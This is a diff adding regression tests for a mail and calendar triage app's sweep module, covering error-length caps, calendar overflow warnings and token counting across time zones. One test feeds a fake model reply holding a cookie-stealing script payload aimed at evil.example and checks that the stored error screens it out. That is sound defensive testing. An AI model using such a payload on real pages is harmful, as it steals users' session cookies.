@@ -18,8 +18,10 @@ const {
 } = await import('../core/db.mjs');
 const { SWEEP_KV } = await import('../core/triage.mjs');
 const { seedSampleData } = await import('../core/sample-data.mjs');
+const { nowISO, dayKey } = await import('../core/time.mjs');
 const {
   runSweep, shouldRunFull, nextRunAt, isActiveHour, Scheduler, FULL_RUN_MAX_AGE_MS,
+  recordTokens,
 } = await import('../core/sweep.mjs');
 
 let seq = 0;
@@ -1199,6 +1201,236 @@ test('a successful full run clears the pending-new counter', async () => {
     deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
   });
   assert.equal(getKV(db, SWEEP_KV.pendingNew), '0');
+});
+
+/* ================================================================== *
+ * What a failure is allowed to store
+ *
+ * REGRESSION (#47). Every string this file writes about a failure lands in
+ * three places outside the process: `runs.error` and `runs.stats_json` in
+ * SQLite, `/api/state` on every board read, and the settings export. IMAP is
+ * where that bites — `err.message` there is server-supplied text with no
+ * ceiling of its own. Reproduced end to end against a hostile mock that
+ * answered with 48 MiB: the stored `sources[0].error` was 50,331,713 characters
+ * and `GET /api/state` answered 200 with a 50,332,527-byte body, on every read
+ * and every three-minute heartbeat, until the next successful sweep.
+ * ================================================================== */
+
+test('a mail server that answers with megabytes does not get megabytes of storage', async () => {
+  const db = fresh();
+  const huge = `NO ${'A'.repeat(2_000_000)}`;
+  const model = fakeModel(board([item()]));
+  const result = await runSweep({
+    db,
+    config: baseConfig({ mail: [mailAccount()] }),
+    mode: 'full',
+    deps: {
+      getSecret: SECRETS,
+      complete: model,
+      fetchMail: async () => { throw new Error(huge); },
+    },
+  });
+
+  const source = result.stats.sources.find((s) => s.kind === 'mail' && s.ok === false);
+  assert.ok(source, 'the failed mailbox should still be reported');
+  assert.ok(source.error.length <= 500,
+    `sources[].error is stored and re-served on every board read; got ${source.error.length} chars`);
+  assert.match(source.error, /^NO A+…$/, 'what survives is still the beginning of what the server said');
+
+  // ...and the same ceiling on the row the board reads back out of SQLite,
+  // which is the copy that actually rides /api/state.
+  const stored = getRun(db, result.runId).stats;
+  const storedSource = stored.sources.find((s) => s.ok === false);
+  assert.ok(storedSource.error.length <= 500);
+  assert.ok(JSON.stringify(stored).length < 5_000,
+    'the whole stats blob must stay small enough to serve on every read');
+});
+
+test('a run that fails on a huge error stores a bounded reason', async () => {
+  const db = fresh();
+  const huge = 'B'.repeat(1_000_000);
+  const result = await runSweep({
+    db,
+    config: baseConfig({ mail: [mailAccount()] }),
+    mode: 'full',
+    deps: {
+      getSecret: SECRETS,
+      complete: async () => { throw new Error(huge); },
+      fetchMail: async () => [fetched()],
+    },
+  });
+  assert.equal(result.ok, false);
+  assert.ok(result.error.length <= 500, `runs.error is one column; got ${result.error.length} chars`);
+  assert.ok((getRun(db, result.runId).error || '').length <= 500);
+});
+
+/**
+ * The second, smaller half of the same finding. The "it began …" quote is
+ * MODEL OUTPUT, it is stored in `runs.error`, and `runs.error` is re-served by
+ * /api/state and copied into the settings export — so markup reaching it is the
+ * exact case docs/SECURITY.md says never happens.
+ */
+test('a model reply that is trying to be markup never reaches runs.error', async () => {
+  const db = fresh();
+  const result = await runSweep({
+    db,
+    config: baseConfig({ mail: [mailAccount()] }),
+    mode: 'full',
+    deps: {
+      getSecret: SECRETS,
+      complete: fakeModel('<script>fetch("http://evil.example/"+document.cookie)</script> sorry, no JSON here'),
+      fetchMail: async () => [fetched()],
+    },
+  });
+
+  assert.equal(result.ok, false);
+  assert.match(result.error, /not with JSON/, 'the reader still has to be told what went wrong');
+  for (const forbidden of ['<script', 'document.cookie', 'evil.example']) {
+    assert.equal(result.error.includes(forbidden), false,
+      `${forbidden} must not travel in the run result`);
+    assert.equal((getRun(db, result.runId).error || '').includes(forbidden), false,
+      `${forbidden} must not be written to runs.error`);
+  }
+
+  // A harmless reply keeps its sample — the screen is not a blanket ban on
+  // showing the reader what the model said.
+  const plain = await runSweep({
+    db,
+    config: baseConfig({ mail: [mailAccount()] }),
+    mode: 'full',
+    deps: {
+      getSecret: SECRETS,
+      complete: fakeModel('I am afraid I cannot produce that board.'),
+      fetchMail: async () => [fetched()],
+    },
+  });
+  assert.match(plain.error, /it began "I am afraid I cannot produce that board\."/);
+});
+
+/* ================================================================== *
+ * The calendar ceiling
+ *
+ * `expand()` drops instances past its cap from the far end of the window and
+ * says so with `ics.warn(…)` — into a terminal, which in the desktop app is
+ * nobody. The sweep is the only thing between that and a screen.
+ * ================================================================== */
+
+test('a calendar too big for the window says so where somebody will read it', async () => {
+  const db = fresh();
+  const dir = fs.mkdtempSync(path.join(HOME_ROOT, 'ics-'));
+  const file = path.join(dir, 'busy.ics');
+  // 1,600 separate events inside the swept window, against a ceiling of 1,500.
+  // Written out rather than expanded from an RRULE so the count under test is
+  // the count on disk and not a recurrence rule's opinion of it.
+  const day = (n) => new Date(Date.now() + (n % 40 + 1) * 86_400_000).toISOString().slice(0, 10).replace(/-/g, '');
+  const events = Array.from({ length: 1_600 }, (_, i) => [
+    'BEGIN:VEVENT',
+    `UID:bulk-${i}@example.com`,
+    `DTSTART:${day(i)}T${String(i % 24).padStart(2, '0')}0000Z`,
+    `DTEND:${day(i)}T${String(i % 24).padStart(2, '0')}3000Z`,
+    `SUMMARY:Bulk ${i}`,
+    'END:VEVENT',
+  ].join('\r\n'));
+  fs.writeFileSync(file, ['BEGIN:VCALENDAR', 'VERSION:2.0', ...events, 'END:VCALENDAR'].join('\r\n'));
+
+  const result = await runSweep({
+    db,
+    config: baseConfig({ calendars: [{ id: 'c_busy', enabled: true, kind: 'file', label: 'Busy', url: file }] }),
+    mode: 'light',
+    deps: { getSecret: SECRETS },
+  });
+
+  const source = result.stats.sources.find((s) => s.kind === 'calendar');
+  assert.ok(source, 'the calendar should be reported');
+  assert.equal(source.count, 1_500, 'the events that survived are still delivered');
+  assert.equal(source.ok, false,
+    'ui/views/now.js only renders sources it was told are not ok, so this is what makes the note visible');
+  assert.match(source.error, /1,500/);
+  assert.match(source.error, /dropped/);
+
+  // A calendar inside the ceiling raises nothing at all.
+  const quiet = await runSweep({
+    db: fresh(),
+    config: baseConfig({ calendars: [{ id: 'c_quiet', enabled: true, kind: 'file', label: 'Quiet', url: file }] }),
+    mode: 'light',
+    deps: {
+      getSecret: SECRETS,
+      fetchEvents: async () => [{ uid: 'x', title: 'One meeting', startsAt: new Date(Date.now() + 86_400_000).toISOString() }],
+    },
+  });
+  const quietSource = quiet.stats.sources.find((s) => s.kind === 'calendar');
+  assert.equal(quietSource.ok, true);
+  assert.equal(quietSource.error, null);
+});
+
+/* ================================================================== *
+ * The token counter
+ *
+ * REGRESSION (#51). `recordTokens` had exactly one caller — `finish` — so the
+ * Ask panel's spend was invisible: measured with a mock upstream, twenty
+ * `POST /api/ask` calls reporting 100,000 tokens over SSE left `sweep.tokens`
+ * null and `/api/state` carrying no `tokens` at all. core/server.mjs is now the
+ * second caller, and this is the shape it calls with.
+ * ================================================================== */
+
+test('a non-sweep spender moves the tokens and neither of the run counts', async () => {
+  const db = fresh();
+  const model = fakeModel(board([item()]));
+  const swept = await runSweep({
+    db,
+    config: baseConfig({ mail: [mailAccount()] }),
+    mode: 'full',
+    deps: { getSecret: SECRETS, complete: model, fetchMail: async () => [fetched()] },
+  });
+  assert.equal(swept.ok, true);
+  const afterSweep = JSON.parse(getKV(db, SWEEP_KV.tokens));
+  assert.equal(afterSweep.runs, 1);
+  assert.equal(afterSweep.modelRuns, 1);
+
+  /* The zone is passed, exactly as core/server.mjs's recordAskSpend passes it,
+     and leaving it off is the bug this argument exists to prevent rather than a
+     shorthand. `recordTokens` carries the running day forward only while
+     `stored.day === dayKey(now)`; the sweep stamped its row with `nowISO(tz)`
+     for the configured zone, so a second writer that defaults to `nowISO()` —
+     the machine zone — computes a different date for every hour the two zones
+     disagree, and the day is treated as new. In production that meant the first
+     question typed into Ask reset the token counter the rail shows to zero.
+     Left as a bare call this test was green until 20:00 EDT and red after it,
+     which is how the defect surfaced. */
+  const tz = baseConfig().identity.timezone;
+  const after = recordTokens(db, {
+    tokensIn: 900, tokensOut: 100, thought: false, sweep: false, now: nowISO(tz),
+  });
+  assert.equal(after.tokensIn, afterSweep.tokensIn + 900, 'Ask is spend, and spend is counted');
+  assert.equal(after.tokensOut, afterSweep.tokensOut + 100);
+  assert.equal(after.runs, 1, 'a question typed into a panel is not a sweep that happened');
+  assert.equal(after.modelRuns, 1);
+  assert.equal(after.lifetime.tokensIn, afterSweep.lifetime.tokensIn + 900);
+  assert.equal(after.lifetime.runs, 1);
+
+  // Persisted under the key /api/state reads, not merely returned.
+  const stored = JSON.parse(getKV(db, SWEEP_KV.tokens));
+  assert.equal(stored.tokensIn, after.tokensIn);
+  assert.equal(stored.runs, 1);
+
+  /* And the other half of the same contract: a second writer that stamps the
+     row from a DIFFERENT zone does not add to the day, it starts a new one.
+     This is the mechanism behind a real defect — core/server.mjs's
+     recordAskSpend defaulted to `nowISO()`, the machine zone, while the sweep
+     stamps `nowISO(tz)` for the configured one, so for every hour the two were
+     on different dates the first question typed into Ask silently reset the
+     counter the rail shows. The zone is picked at run time because a fixed one
+     only diverges for part of the day; at any instant two calendar dates exist
+     on Earth, so one of these always disagrees with `tz`. */
+  const elsewhere = ['Pacific/Kiritimati', 'Pacific/Midway', 'Asia/Tokyo', 'UTC']
+    .find((z) => dayKey(nowISO(z)) !== dayKey(nowISO(tz)));
+  assert.ok(elsewhere, 'no zone disagrees with the configured one about the date, which cannot happen');
+  const crossZone = recordTokens(db, {
+    tokensIn: 5, tokensOut: 5, thought: false, sweep: false, now: nowISO(elsewhere),
+  });
+  assert.equal(crossZone.tokensIn, 5,
+    'a row stamped in another zone must read as a new day — if this ever adds, dayKey stopped '
+    + 'deciding the day and recordAskSpend no longer needs to be handed the configured zone');
 });
 
 /* ================================================================== *
